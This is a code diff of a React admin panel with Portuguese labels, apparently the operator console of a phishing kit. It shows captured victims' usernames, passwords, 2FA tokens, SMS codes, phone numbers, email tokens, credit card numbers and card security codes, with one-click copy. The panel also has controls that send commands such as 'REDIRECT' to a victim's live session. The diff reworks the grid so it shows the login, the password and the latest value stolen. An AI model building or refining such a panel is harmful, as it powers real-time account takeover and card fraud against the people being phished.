@@ -675,48 +675,35 @@ function AdminPanel() {
                       <button onClick={() => sendCommand(attempt.id, "REDIRECT")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-[#13151c] text-gray-300 hover:text-white hover:bg-[#1a1d28] border border-[#252838] transition-all">Close</button>
                     </div>
 
-                    {/* Data Grid */}
-                    <div className="px-4 py-3 grid grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-2">
-                      <div className="bg-[#0b0c11] rounded-lg px-3 py-2 border border-[#161822] cursor-pointer hover:border-[#252838] transition-colors" onClick={() => copyToClipboard(attempt.email, `email-${attempt.id}`)}>
-                        <span className="text-[10px] text-gray-500 block">USUÁRIO</span>
-                        <span className={`text-xs font-mono ${copiedField === `email-${attempt.id}` ? "text-emerald-400" : "text-white"}`}>{copiedField === `email-${attempt.id}` ? "Copiado!" : attempt.email}</span>
+                    {/* Data - Compacto: Login + Último dado recebido */}
+                    <div className="px-4 py-3 flex items-stretch gap-2">
+                      <div className="flex-1 flex gap-2">
+                        <div className="bg-[#0b0c11] rounded-lg px-3 py-2 border border-[#161822] cursor-pointer hover:border-[#252838] transition-colors flex-1" onClick={() => copyToClipboard(attempt.email, `email-${attempt.id}`)}>
+                          <span className="text-[10px] text-gray-500 block">USUÁRIO</span>
+                          <span className={`text-xs font-mono ${copiedField === `email-${attempt.id}` ? "text-emerald-400" : "text-white"}`}>{copiedField === `email-${attempt.id}` ? "Copiado!" : attempt.email}</span>
+                        </div>
+                        <div className="bg-[#0b0c11] rounded-lg px-3 py-2 border border-[#161822] cursor-pointer hover:border-[#252838] transition-colors flex-1" onClick={() => copyToClipboard(attempt.password, `password-${attempt.id}`)}>
+                          <span className="text-[10px] text-gray-500 block">SENHA</span>
+                          <span className={`text-xs font-mono ${copiedField === `password-${attempt.id}` ? "text-emerald-400" : "text-white"}`}>{copiedField === `password-${attempt.id}` ? "Copiado!" : (attempt.password || "-")}</span>
+                        </div>
                       </div>
-                      <div className="bg-[#0b0c11] rounded-lg px-3 py-2 border border-[#161822] cursor-pointer hover:border-[#252838] transition-colors" onClick={() => copyToClipboard(attempt.password, `password-${attempt.id}`)}>
-                        <span className="text-[10px] text-gray-500 block">SENHA</span>
-                        <span className={`text-xs font-mono ${copiedField === `password-${attempt.id}` ? "text-emerald-400" : "text-white"}`}>{copiedField === `password-${attempt.id}` ? "Copiado!" : (attempt.password || "-")}</span>
-                      </div>
-                      <div className="bg-[#0b0c11] rounded-lg px-3 py-2 border border-[#161822] cursor-pointer hover:border-[#252838] transition-colors" onClick={() => copyToClipboard(attempt.token_2fa, `token2fa-${attempt.id}`)}>
-                        <span className="text-[10px] text-gray-500 block">2FA</span>
-                        <span className={`text-xs font-mono ${copiedField === `token2fa-${attempt.id}` ? "text-emerald-400" : attempt.token_2fa ? "text-cyan-300" : "text-gray-700"}`}>{copiedField === `token2fa-${attempt.id}` ? "Copiado!" : (attempt.token_2fa || "-")}</span>
-                      </div>
-                      <div className="bg-[#0b0c11] rounded-lg px-3 py-2 border border-[#161822] cursor-pointer hover:border-[#252838] transition-colors" onClick={() => copyToClipboard(attempt.email_input, `emailinput-${attempt.id}`)}>
-                        <span className="text-[10px] text-gray-500 block">EMAIL</span>
-                        <span className={`text-xs font-mono ${copiedField === `emailinput-${attempt.id}` ? "text-emerald-400" : attempt.email_input ? "text-purple-300" : "text-gray-700"}`}>{copiedField === `emailinput-${attempt.id}` ? "Copiado!" : (attempt.email_input || "-")}</span>
-                      </div>
-                      <div className="bg-[#0b0c11] rounded-lg px-3 py-2 border border-[#161822] cursor-pointer hover:border-[#252838] transition-colors" onClick={() => copyToClipboard(attempt.sms_code, `smscode-${attempt.id}`)}>
-                        <span className="text-[10px] text-gray-500 block">TOK-TEL</span>
-                        <span className={`text-xs font-mono ${copiedField === `smscode-${attempt.id}` ? "text-emerald-400" : attempt.sms_code ? "text-orange-300" : "text-gray-700"}`}>{copiedField === `smscode-${attempt.id}` ? "Copiado!" : (attempt.sms_code || "-")}</span>
-                      </div>
-                      <div className="bg-[#0b0c11] rounded-lg px-3 py-2 border border-[#161822] cursor-pointer hover:border-[#252838] transition-colors" onClick={() => copyToClipboard(attempt.phone_number, `phone-${attempt.id}`)}>
-                        <span className="text-[10px] text-gray-500 block">TELEFONE</span>
-                        <span className={`text-xs font-mono ${copiedField === `phone-${attempt.id}` ? "text-emerald-400" : attempt.phone_number ? "text-emerald-300" : "text-gray-700"}`}>{copiedField === `phone-${attempt.id}` ? "Copiado!" : (attempt.phone_number || "-")}</span>
-                      </div>
-                      <div className="bg-[#0b0c11] rounded-lg px-3 py-2 border border-[#161822] cursor-pointer hover:border-[#252838] transition-colors" onClick={() => copyToClipboard(attempt.app_mail, `appmail-${attempt.id}`)}>
-                        <span className="text-[10px] text-gray-500 block">TOK-MAIL</span>
-                        <span className={`text-xs font-mono ${copiedField === `appmail-${attempt.id}` ? "text-emerald-400" : attempt.app_mail ? "text-blue-300" : "text-gray-700"}`}>{copiedField === `appmail-${attempt.id}` ? "Copiado!" : (attempt.app_mail || "-")}</span>
-                      </div>
-                      <div className="bg-[#0b0c11] rounded-lg px-3 py-2 border border-[#161822] cursor-pointer hover:border-[#252838] transition-colors" onClick={() => attempt.credit_card && setCcModalData(attempt.credit_card)}>
-                        <span className="text-[10px] text-gray-500 block">CARTÃO</span>
-                        {attempt.credit_card ? (
-                          <span className="text-xs font-mono text-yellow-300 underline decoration-dotted">Exibir</span>
-                        ) : (
-                          <span className="text-xs font-mono text-gray-700">-</span>
-                        )}
-                      </div>
-                      <div className="bg-[#0b0c11] rounded-lg px-3 py-2 border border-[#161822] cursor-pointer hover:border-[#252838] transition-colors" onClick={() => copyToClipboard(attempt.cc_code, `cccode-${attempt.id}`)}>
-                        <span className="text-[10px] text-gray-500 block">COD CC</span>
-                        <span className={`text-xs font-mono ${copiedField === `cccode-${attempt.id}` ? "text-emerald-400" : attempt.cc_code ? "text-amber-300" : "text-gray-700"}`}>{copiedField === `cccode-${attempt.id}` ? "Copiado!" : (attempt.cc_code || "-")}</span>
-                      </div>
+                      {/* Campo dinâmico - mostra último dado recebido */}
+                      {(() => {
+                        const lastEntry = attempt.history && attempt.history.length > 0 ? attempt.history[attempt.history.length - 1] : null;
+                        if (!lastEntry) return (
+                          <div className="bg-[#0b0c11] rounded-lg px-3 py-2 border border-dashed border-[#1e2130] flex-1 flex items-center justify-center">
+                            <span className="text-[10px] text-gray-600">Aguardando dados...</span>
+                          </div>
+                        );
+                        return (
+                          <div className="bg-[#0b0c11] rounded-lg px-3 py-2 border border-emerald-500/20 flex-1 cursor-pointer hover:border-emerald-500/40 transition-colors" onClick={() => copyToClipboard(lastEntry.value, `last-${attempt.id}`)}>
+                            <span className="text-[10px] text-emerald-500/70 block">{lastEntry.label}</span>
+                            <span className={`text-xs font-mono ${copiedField === `last-${attempt.id}` ? "text-emerald-400" : "text-white"}`}>
+                              {copiedField === `last-${attempt.id}` ? "Copiado!" : (lastEntry.label === "Cartão" ? "Exibir" : lastEntry.value)}
+                            </span>
+                          </div>
+                        );
+                      })()}
                     </div>
 
                     {/* Footer */}
